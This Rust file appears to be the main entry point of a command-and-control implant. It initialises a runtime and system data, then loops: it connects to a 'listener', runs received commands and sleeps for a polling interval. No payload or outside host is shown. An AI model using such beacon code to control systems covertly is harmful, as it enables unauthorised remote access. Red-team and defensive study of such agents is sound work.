pub mod command;
pub mod common;
pub mod setup;

extern crate alloc;
use alloc::sync::Arc;

use command::handler::command_handler;
use mod_agentcore::instance;
use mod_win32::nt_time::wait_until;
use rs2_runtime::Runtime;
use setup::{
    communication::initialize_protocol,
    runtime_manager::initialize_runtime,
    system_data::initialize_system_data,
};

fn main() {
    let rt = initialize_runtime();
    initialize_system_data();
    routine(rt.clone());
}

pub fn routine<R>(rt: Arc<R>)
where
    R: Runtime,
{
    loop {
        unsafe {
            if !instance().session.connected {
                // If not connected, try to connect to the listener
                initialize_protocol(rt.clone());
            }

            if instance().session.connected {
                // If connected, handle incoming commands
                command_handler(rt.clone());
            }

            wait_until(instance().config.polling_interval);
        }
    }
}
